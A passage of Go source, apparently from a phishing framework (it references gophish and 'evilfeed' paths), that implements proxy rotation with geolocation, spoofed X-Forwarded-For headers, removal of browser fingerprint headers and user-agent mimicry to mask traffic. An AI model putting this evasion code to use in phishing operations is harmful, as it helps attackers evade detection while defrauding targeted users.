	proxyPoolEnabledCallback = callback
}

// TestProxy tests a single proxy and returns success status and origin IP
// IMPORTANT: This preserves InUse state - testing doesn't affect session assignments
func (pr *ProxyRotator) TestProxy(index int) (bool, string, error) {
	pr.mu.RLock()
	if index < 0 || index >= len(pr.proxies) {
		pr.mu.RUnlock()
		return false, "", fmt.Errorf("invalid proxy index")
	}
	proxy := pr.proxies[index]
	wasInUse := proxy.InUse
	sessionID := proxy.SessionID
	pr.mu.RUnlock()

	success, originIP, latencyMs := testProxyDirect(&proxy)

	// Lookup geo info for the origin IP
	var country, city, countryCode string
	if success && originIP != "" {
		country, city, countryCode = lookupProxyGeo(originIP)
	}

	pr.mu.Lock()
	if index < len(pr.proxies) {
		pr.proxies[index].LastChecked = time.Now() // Update LastChecked timestamp
		pr.proxies[index].Latency = time.Duration(latencyMs) * time.Millisecond
		if success {
			pr.proxies[index].Active = true
			pr.proxies[index].SuccessRate = pr.proxies[index].SuccessRate*0.9 + 0.1
			// Store geo info
			if country != "" {
				pr.proxies[index].Country = countryCode // Store 2-letter code for flag display
			}
			if city != "" {
				pr.proxies[index].Region = city // Store city in Region field
				pr.proxies[index].City = city   // Store city in City field for frontend
			}
			// PRESERVE InUse state - don't overwrite if proxy is assigned to a session
			if wasInUse {
				pr.proxies[index].InUse = true
				pr.proxies[index].SessionID = sessionID
				pr.proxies[index].Status = "in_use"
			} else {
				// Proxy is available - mark as active for assignment
				pr.proxies[index].InUse = false
				pr.proxies[index].SessionID = ""
				pr.proxies[index].Status = "active"
			}
		} else {
			pr.proxies[index].Active = false
			pr.proxies[index].Status = "failed"
			pr.proxies[index].SuccessRate *= 0.9
			// Release from session if it was in use (failed proxy can't serve traffic)
			pr.proxies[index].InUse = false
			pr.proxies[index].SessionID = ""
		}
	}
	pr.mu.Unlock()

	return success, originIP, nil
}

// lookupProxyGeo fetches geographic location for an IP address
// Returns country name, city, and 2-letter country code
func lookupProxyGeo(ip string) (country, city, countryCode string) {
	// Extract IP without port if present
	if idx := strings.Index(ip, ":"); idx != -1 {
		ip = ip[:idx]
	}

	// Skip private/local IPs
	if strings.HasPrefix(ip, "127.") || strings.HasPrefix(ip, "192.168.") ||
		strings.HasPrefix(ip, "10.") || ip == "::1" || ip == "localhost" {
		return "Local", "", ""
	}

	// 1. Try Local MaxMind GeoLite2 DB
	// Check common locations defined in setup.sh
	dbPaths := []string{
		"gophish/static/db/geolite2-city.mmdb",
		"evilfeed/GeoLite2-City.mmdb",
	}

	for _, path := range dbPaths {
		if _, err := os.Stat(path); err == nil {
			db, err := geoip2.Open(path)
			if err != nil {
				continue
			}

			parsedIP := net.ParseIP(ip)
			if parsedIP != nil {
				record, err := db.City(parsedIP)
				if err == nil {
					country = record.Country.Names["en"]
					city = record.City.Names["en"]
					countryCode = record.Country.IsoCode

					db.Close()
					if country != "" {
						return country, city, countryCode
					}
				}
			}
			db.Close()
			break // DB found but lookup failed or no data
		}
	}

	// 2. Switch to ip-api.com for better reliability (rate limit: 45 req/min)
	// ipapi.co is completely failing / strict rate limits
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(fmt.Sprintf("http://ip-api.com/json/%s", ip))
	if err != nil || resp.StatusCode != 200 {
		// Fallback to ipapi.co if ip-api.com fails
		if resp != nil {
			resp.Body.Close()
		}
		resp, err = client.Get(fmt.Sprintf("https://ipapi.co/%s/json/", ip))
		if err != nil || resp.StatusCode != 200 {
			return "Unknown", "", ""
		}
	}
	defer resp.Body.Close()

	var geo struct {
		// Field mapping for ip-api.com
		Country     string `json:"country"`
		City        string `json:"city"`
		CountryCode string `json:"countryCode"`
		// Field mapping for ipapi.co
		CountryNameCo string `json:"country_name"`
		CountryCodeCo string `json:"country_code"`
	}

	body, _ := ioutil.ReadAll(resp.Body)
	if err := json.Unmarshal(body, &geo); err != nil {
		return "Unknown", "", ""
	}

	// Unify fields (handle both API formats)
	cName := geo.Country
	cCode := geo.CountryCode
	if cName == "" {
		cName = geo.CountryNameCo
	}
	if cCode == "" {
		cCode = geo.CountryCodeCo
	}

	return cName, geo.City, cCode
}

// TestAllProxies tests all proxies in the pool and returns stats
func (pr *ProxyRotator) TestAllProxies() (total, passed, failed int) {
	pr.mu.RLock()
	total = len(pr.proxies)
	pr.mu.RUnlock()

	if total == 0 {
		return 0, 0, 0
	}

	var wg sync.WaitGroup
	var passedCount, failedCount int32
	var countMu sync.Mutex

	for i := 0; i < total; i++ {
		wg.Add(1)
		go func(index int) {
			defer wg.Done()
			success, _, _ := pr.TestProxy(index)
			countMu.Lock()
			if success {
				passedCount++
			} else {
				failedCount++
			}
			countMu.Unlock()
		}(i)
	}

	wg.Wait()
	return total, int(passedCount), int(failedCount)
}

// ClearFailedProxies removes all proxies with failed status
func (pr *ProxyRotator) ClearFailedProxies() int {
	pr.mu.Lock()
	defer pr.mu.Unlock()

	newProxies := make([]ProxyInfo, 0, len(pr.proxies))
	removed := 0

	for _, p := range pr.proxies {
		if p.Active || p.Status != "failed" {
			newProxies = append(newProxies, p)
		} else {
			removed++
			log.Info("proxy-pool: Removed failed proxy %s:%d", p.Host, p.Port)
		}
	}

	pr.proxies = newProxies
	pr.config.ProxyList = newProxies
	return removed
}

// ToggleProxyActive enables or disables a specific proxy
func (pr *ProxyRotator) ToggleProxyActive(index int) error {
	pr.mu.Lock()
	defer pr.mu.Unlock()

	if index < 0 || index >= len(pr.proxies) {
		return fmt.Errorf("invalid proxy index")
	}

	// Don't allow disabling if in use
	if pr.proxies[index].InUse && pr.proxies[index].Active {
		return fmt.Errorf("cannot disable proxy while in use by session %s", pr.proxies[index].SessionID)
	}

	pr.proxies[index].Active = !pr.proxies[index].Active
	if pr.proxies[index].Active {
		pr.proxies[index].Status = "active"
	} else {
		pr.proxies[index].Status = "disabled"
	}

	log.Info("proxy-pool: Proxy %s:%d %s", pr.proxies[index].Host, pr.proxies[index].Port,
		map[bool]string{true: "enabled", false: "disabled"}[pr.proxies[index].Active])
	return nil
}

// RemoveProxyByIndex removes a proxy by its index
func (pr *ProxyRotator) RemoveProxyByIndex(index int) error {
	pr.mu.Lock()
	defer pr.mu.Unlock()

	if index < 0 || index >= len(pr.proxies) {
		return fmt.Errorf("invalid proxy index")
	}

	if pr.proxies[index].InUse {
		return fmt.Errorf("cannot remove proxy while in use by session %s", pr.proxies[index].SessionID)
	}

	host := pr.proxies[index].Host
	port := pr.proxies[index].Port
	pr.proxies = append(pr.proxies[:index], pr.proxies[index+1:]...)
	pr.config.ProxyList = pr.proxies

	log.Info("proxy-pool: Removed proxy %s:%d", host, port)
	return nil
}

// HeaderRandomizer implementation
func NewHeaderRandomizer(config *HeaderRandomConfig) *HeaderRandomizer {
	if config == nil {
		config = &HeaderRandomConfig{Enabled: false}
	}

	hr := &HeaderRandomizer{
		config:   config,
		profiles: config.HeaderProfiles,
	}

	if len(hr.profiles) == 0 {
		hr.profiles = getDefaultHeaderProfiles()
	}

	return hr
}

func (hr *HeaderRandomizer) RandomizeRequest(req *http.Request) {
	if !hr.config.Enabled {
		return
	}

	// Select random header profile
	profile := hr.getRandomProfile()

	// Apply user agent from profile
	if hr.config.RandomizeUserAgent && profile.UserAgent != "" {
		req.Header.Set("User-Agent", profile.UserAgent)
	}

	// Apply headers from profile
	for key, value := range profile.Headers {
		req.Header.Set(key, value)
	}

	// Randomize accept headers
	if hr.config.RandomizeAcceptHeaders {
		hr.randomizeAcceptHeaders(req)
	}

	// Add fake headers
	if hr.config.AddFakeHeaders {
		hr.addFakeHeaders(req)
	}

	// Remove fingerprinting headers
	if hr.config.RemoveFingerprints {
		hr.removeFingerprints(req)
	}
}

func (hr *HeaderRandomizer) getRandomProfile() HeaderProfile {
	if len(hr.profiles) == 0 {
		return HeaderProfile{}
	}

	num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(hr.profiles))))
	return hr.profiles[num.Int64()]
}

func (hr *HeaderRandomizer) randomizeAcceptHeaders(req *http.Request) {
	acceptHeaders := []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"application/json,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"*/*",
	}

	num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(acceptHeaders))))
	req.Header.Set("Accept", acceptHeaders[num.Int64()])

	languages := []string{
		"en-US,en;q=0.9",
		"en-US,en;q=0.8",
		"en-GB,en;q=0.9",
		"en-US,en;q=0.5",
	}

	num, _ = rand.Int(rand.Reader, big.NewInt(int64(len(languages))))
	req.Header.Set("Accept-Language", languages[num.Int64()])

	encodings := []string{
		"gzip, deflate, br",
		"gzip, deflate",
		"identity",
	}

	num, _ = rand.Int(rand.Reader, big.NewInt(int64(len(encodings))))
	req.Header.Set("Accept-Encoding", encodings[num.Int64()])
}

func (hr *HeaderRandomizer) addFakeHeaders(req *http.Request) {
	fakeHeaders := map[string][]string{
		"X-Forwarded-For":           {"192.168.1.1", "10.0.0.1", "172.16.0.1"},
		"X-Real-IP":                 {"203.0.113.1", "198.51.100.1", "192.0.2.1"},
		"X-Client-IP":               {"203.0.113.2", "198.51.100.2", "192.0.2.2"},
		"Cache-Control":             {"no-cache", "max-age=0", "no-store"},
		"Pragma":                    {"no-cache"},
		"Upgrade-Insecure-Requests": {"1"},
		"Sec-Fetch-Site":            {"none", "same-origin", "cross-site"},
		"Sec-Fetch-Mode":            {"navigate", "cors", "no-cors"},
		"Sec-Fetch-User":            {"?1"},
		"Sec-Fetch-Dest":            {"document", "empty"},
	}

	for header, values := range fakeHeaders {
		if req.Header.Get(header) == "" {
			num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(values))))
			req.Header.Set(header, values[num.Int64()])
		}
	}
}

func (hr *HeaderRandomizer) removeFingerprints(req *http.Request) {
	fingerprintHeaders := []string{
		"X-DevTools-Emulate-Network-Conditions-Client-Id",
		"X-Client-Data",
		"X-Chrome-UMA-Enabled",
		"X-Chrome-Variations",
		"Sec-CH-UA",
		"Sec-CH-UA-Mobile",
		"Sec-CH-UA-Platform",
	}

	for _, header := range fingerprintHeaders {
		req.Header.Del(header)
	}
}

// Additional implementations continue...
// (TrafficObfuscator, IPMasker, UserAgentRotator, etc.)

// Helper functions
func getDefaultAnonymityConfig() *AnonymityConfig {
	return &AnonymityConfig{
		Enabled: true,
		ProxyRotation: &ProxyRotationConfig{
			Enabled:          false,
			RotationInterval: 5 * time.Minute,
			HealthCheck:      true,
			FailoverEnabled:  true,
			LoadBalancing:    "round_robin",
			MaxRetries:       3,
		},
		HeaderRandomization: &HeaderRandomConfig{
			Enabled:                true,
			RandomizeUserAgent:     true,
			RandomizeAcceptHeaders: true,
			AddFakeHeaders:         true,
			RemoveFingerprints:     true,
		},
		TrafficObfuscation: &TrafficObfuscConfig{
			Enabled: false,
		},
		IPMasking: &IPMaskingConfig{
			Enabled: false,
		},
		UserAgentRotation: &UserAgentConfig{
			Enabled:              true,
			RotationInterval:     30 * time.Minute,
			BrowserMimicry:       true,
			PlatformMimicry:      true,
			VersionRandomization: true,
		},
		DNSObfuscation: &DNSObfuscConfig{
			Enabled: false,
		},
		TLSFingerprinting: &TLSFingerprintConfig{
			Enabled: false,
		},
		TimingObfuscation: &TimingObfuscConfig{
			Enabled: true,
		},
	}
}

func getDefaultHeaderProfiles() []HeaderProfile {
	return []HeaderProfile{
		{
			Name:      "Chrome Windows",
			UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
			Headers: map[string]string{
				"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
				"Accept-Language":           "en-US,en;q=0.9",
				"Accept-Encoding":           "gzip, deflate, br",
				"DNT":                       "1",
				"Connection":                "keep-alive",
				"Upgrade-Insecure-Requests": "1",
			},
			Probability: 0.4,
			BrowserType: "chrome",
			Platform:    "windows",
		},
		{
			Name:      "Firefox Windows",
			UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0",
			Headers: map[string]string{
				"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
				"Accept-Language":           "en-US,en;q=0.5",
				"Accept-Encoding":           "gzip, deflate, br",
				"DNT":                       "1",
				"Connection":                "keep-alive",
				"Upgrade-Insecure-Requests": "1",
			},
			Probability: 0.3,
			BrowserType: "firefox",
			Platform:    "windows",
		},
		{
			Name:      "Safari macOS",
			UserAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
			Headers: map[string]string{
				"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
				"Accept-Language":           "en-US,en;q=0.9",
				"Accept-Encoding":           "gzip, deflate, br",
				"Connection":                "keep-alive",
				"Upgrade-Insecure-Requests": "1",
			},
			Probability: 0.2,
			BrowserType: "safari",
			Platform:    "macos",
		},
		{
			Name:      "Edge Windows",
			UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46",
			Headers: map[string]string{
				"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
				"Accept-Language":           "en-US,en;q=0.9",
				"Accept-Encoding":           "gzip, deflate, br",
				"DNT":                       "1",
				"Connection":                "keep-alive",
				"Upgrade-Insecure-Requests": "1",
			},
			Probability: 0.1,
			BrowserType: "edge",
			Platform:    "windows",
		},
	}
}

// UserAgentRotator implementation
func NewUserAgentRotator(config *UserAgentConfig) *UserAgentRotator {
	if config == nil {
		config = &UserAgentConfig{Enabled: false}
	}

	uar := &UserAgentRotator{
		config:     config,
		userAgents: config.UserAgentDatabase,
		current:    0,
	}

	if len(uar.userAgents) == 0 {
		uar.userAgents = getDefaultUserAgents()
	}

	return uar
}

func (uar *UserAgentRotator) GetRandomUserAgent() string {
	if !uar.config.Enabled || len(uar.userAgents) == 0 {
		return ""
	}

	uar.mu.Lock()
	defer uar.mu.Unlock()

	num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(uar.userAgents))))
	index := int(num.Int64())

	uar.userAgents[index].LastUsed = time.Now()
	return uar.userAgents[index].UserAgent
}

func getDefaultUserAgents() []UserAgentEntry {
	return []UserAgentEntry{
		{
			UserAgent:   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
			Browser:     "Chrome",
			Version:     "118.0.0.0",
			Platform:    "Windows",
			Probability: 0.4,
		},
		{
			UserAgent:   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0",
			Browser:     "Firefox",
			Version:     "118.0",
			Platform:    "Windows",
			Probability: 0.3,
		},
		{
			UserAgent:   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
			Browser:     "Safari",
			Version:     "17.0",
			Platform:    "macOS",
			Probability: 0.2,
		},
		{
			UserAgent:   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46",
			Browser:     "Edge",
			Version:     "118.0.2088.46",
			Platform:    "Windows",
			Probability: 0.1,
		},
	}
}

// TLS configuration
func (ae *AnonymityEngine) getTLSConfig() *tls.Config {
	return &tls.Config{
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		InsecureSkipVerify: false,
		ServerName:         "",
	}
}

// Dial context for custom networking
func (ae *AnonymityEngine) getDialContext() func(ctx context.Context, network, addr string) (net.Conn, error) {
	return func(ctx context.Context, network, addr string) (net.Conn, error) {
		dialer := &net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: 30 * time.Second,
		}
		return dialer.DialContext(ctx, network, addr)
	}
}

// TrafficObfuscator implementation stubs
func NewTrafficObfuscator(config *TrafficObfuscConfig) *TrafficObfuscator {
	return &TrafficObfuscator{config: config}
}

func (to *TrafficObfuscator) ObfuscateData(data []byte) ([]byte, error) {
	// Implementation for data obfuscation
	return data, nil
}

func (to *TrafficObfuscator) DeobfuscateData(data []byte) ([]byte, error) {
	// Implementation for data deobfuscation
	return data, nil
}

// IPMasker implementation stubs
func NewIPMasker(config *IPMaskingConfig) *IPMasker {
	return &IPMasker{config: config}
}
